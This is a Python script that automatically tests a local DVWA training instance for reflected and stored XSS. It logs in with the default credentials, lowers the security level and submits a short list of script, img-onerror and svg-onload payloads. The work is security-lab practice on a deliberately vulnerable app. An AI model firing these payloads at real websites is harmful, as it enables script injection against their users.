import requests
import json
import time
from bs4 import BeautifulSoup

# ---------------- CONFIG ---------------- #

BASE_PORT = 8080
RESULT_FILE = "xss_results.json"

DVWA_PATHS = [
    "http://localhost:{port}/",
    "http://localhost:{port}/dvwa/",
    "http://127.0.0.1:{port}/",
    "http://127.0.0.1:{port}/dvwa/",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<script>document.body.style.background='red'</script>"
]

session = requests.Session()

# ---------------- DETECT DVWA ---------------- #

def detect_dvwa():
    for template in DVWA_PATHS:
        url = template.format(port=BASE_PORT)
        try:
            r = requests.get(url + "login.php", timeout=5)
            if r.status_code == 200 and "dvwa" in r.text.lower():
                print(f"[+] DVWA detected at: {url}")
                return url
        except:
            continue
    print("[!] DVWA not detected. Make sure it is running.")
    exit()

BASE_URL = detect_dvwa()
LOGIN_URL = BASE_URL + "login.php"

# ---------------- LOGIN ---------------- #

def login():
    print("[+] Logging into DVWA...")
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find("input", {"name": "user_token"})
    token = token_input["value"] if token_input else ""

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }

    response = session.post(LOGIN_URL, data=login_data)

    if "login.php" in response.url:
        print("[!] Login failed.")
        exit()

    print("[+] Login successful.")

    # Set security LOW
    sec_url = BASE_URL + "security.php"
    sec_page = session.get(sec_url)
    soup = BeautifulSoup(sec_page.text, "html.parser")

    token_input = soup.find("input", {"name": "user_token"})
    sec_token = token_input["value"] if token_input else ""

    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": sec_token
    }

    session.post(sec_url, data=security_data)
    print("[+] Security set to LOW")

# ---------------- FORMS ---------------- #

def get_forms():
    return [
        {
            "url": BASE_URL + "vulnerabilities/xss_r/",
            "method": "GET",
            "inputs": ["name"],
            "type": "Reflected XSS"
        },
        {
            "url": BASE_URL + "vulnerabilities/xss_s/",
            "method": "POST",
            "inputs": ["txtName", "mtxMessage"],
            "type": "Stored XSS"
        }
    ]

# ---------------- GET CSRF TOKEN ---------------- #

def get_token(url):
    try:
        r = session.get(url)
        soup = BeautifulSoup(r.text, "html.parser")
        token_input = soup.find("input", {"name": "user_token"})
        return token_input["value"] if token_input else ""
    except:
        return ""

# ---------------- TEST XSS ---------------- #

def test_xss(forms):
    vulnerabilities = []

    print("\n[+] Starting XSS Testing...\n")

    for form in forms:
        print("=" * 60)
        print(f"[*] Testing {form['type']}")
        print(f"[*] URL: {form['url']}")

        for payload in XSS_PAYLOADS:

            token = get_token(form["url"])

            data = {"Submit": "Submit"}

            for field in form["inputs"]:
                data[field] = payload

            if token:
                data["user_token"] = token

            start = time.time()

            # ---------------- STORED XSS ---------------- #
            if form["type"] == "Stored XSS":

                # Submit payload
                session.post(form["url"], data=data)

                # Reload page to check stored content
                check = session.get(form["url"])

                response_time = round(time.time() - start, 4)

                if payload in check.text:
                    print(f"\n  [✔] STORED XSS VULNERABLE!")
                    print(f"      Payload: {payload}")
                    print(f"      Response Time: {response_time}s")

                    vulnerabilities.append({
                        "url": form["url"],
                        "type": "Stored XSS",
                        "payload": payload,
                        "severity": "High"
                    })

                    break
                else:
                    print(f"  [–] Not stored: {payload}")

            # ---------------- REFLECTED XSS ---------------- #
            else:
                if form["method"] == "GET":
                    response = session.get(form["url"], params=data)
                else:
                    response = session.post(form["url"], data=data)

                response_time = round(time.time() - start, 4)

                if payload in response.text:
                    print(f"\n  [✔] REFLECTED XSS VULNERABLE!")
                    print(f"      Payload: {payload}")
                    print(f"      Response Time: {response_time}s")

                    vulnerabilities.append({
                        "url": form["url"],
                        "type": "Reflected XSS",
                        "payload": payload,
                        "severity": "High"
                    })

                    break
                else:
                    print(f"  [–] Not reflected: {payload}")

    return vulnerabilities

# ---------------- MAIN ---------------- #

if __name__ == "__main__":

    login()

    forms = get_forms()

    results = test_xss(forms)

    output = {
        "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "total_vulnerabilities": len(results),
        "vulnerabilities": results
    }

    with open(RESULT_FILE, "w") as f:
        json.dump(output, f, indent=4)

    print("\n" + "=" * 60)
    print("XSS Testing Completed ✅")
    print(f"Total Vulnerabilities Found: {len(results)}")
    print(f"Results saved to: {RESULT_FILE}")
    print("=" * 60)